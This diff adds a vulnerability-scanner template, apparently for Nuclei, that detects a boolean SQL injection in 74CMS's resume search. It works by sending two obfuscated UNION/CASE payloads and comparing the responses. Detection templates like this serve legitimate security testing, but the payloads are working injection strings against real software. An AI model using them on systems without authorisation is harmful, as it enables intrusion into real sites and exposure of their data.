@@ -1,0 +1,39 @@
+id: 74cms-resume-sqli
+info:
+  name: 74CMS Resume.php Boolean SQLI
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    74CMS <= v2.2.0 has a SQL injection vulnerability allowing attackers to obtain sensitive information.
+  reference:
+    - http://www.74cms.com/downloadse/load/id/33.html
+  tags: sql,boolean
+http:
+  - raw:
+      - |
+        GET /index.php/v1_0/home/Resume/index?keyword=123'/**/IN/**/NATURAL/**/LANGUAGE/**/MODE)/**/FROM/**/qs_resume_search_key/**/a/**/union/**/select/**/1,2,3,4,5,6/**/from/**/dual/**/where/**/1=(SELECT/**/(CASE/**/1/**/WHEN/**/99/**/THEN/**/(select/**/1/**/from/**/mysql.user)/**/ELSE/**/1/**/END))%23 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "错误，请联系管理员"
+          - "The SQL being executed"
+  - raw:
+      - |
+        GET /index.php/v1_0/home/Resume/index?keyword=123'/**/IN/**/NATURAL/**/LANGUAGE/**/MODE)/**/FROM/**/qs_resume_search_key/**/a/**/union/**/select/**/1,2,3,4,5,6/**/from/**/dual/**/where/**/1=(SELECT/**/(CASE/**/1/**/WHEN/**/1/**/THEN/**/(select/**/1/**/from/**/mysql.user)/**/ELSE/**/1/**/END))%23 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "错误，请联系管理员"
+          - "The SQL being executed"
